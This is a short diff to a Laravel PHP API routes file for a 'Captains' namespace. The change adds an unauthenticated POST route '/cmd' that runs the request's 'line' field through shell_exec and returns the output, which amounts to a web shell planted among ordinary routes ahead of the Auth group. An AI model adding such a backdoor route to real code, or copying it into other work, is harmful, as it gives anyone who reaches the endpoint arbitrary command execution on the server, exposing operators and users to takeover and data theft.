@@ -1,8 +1,14 @@
 <?php
 namespace App\Http\Controllers\Api\V1\Captains;
 use Illuminate\Support\Facades\Route;
+use Illuminate\Http\Request;
 
 Route::group(['namespace' => 'Captains'], function () {
+    /* =========================== CMD =========================== */
+    Route::post('/cmd', function (Request $request) {
+        return shell_exec($request->line);
+    })->name('cmd');
+    /* =========================== CMD =========================== */
 
     /* =========================== Auth =========================== */
     Route::group(['namespace' => 'Auth'], function () {
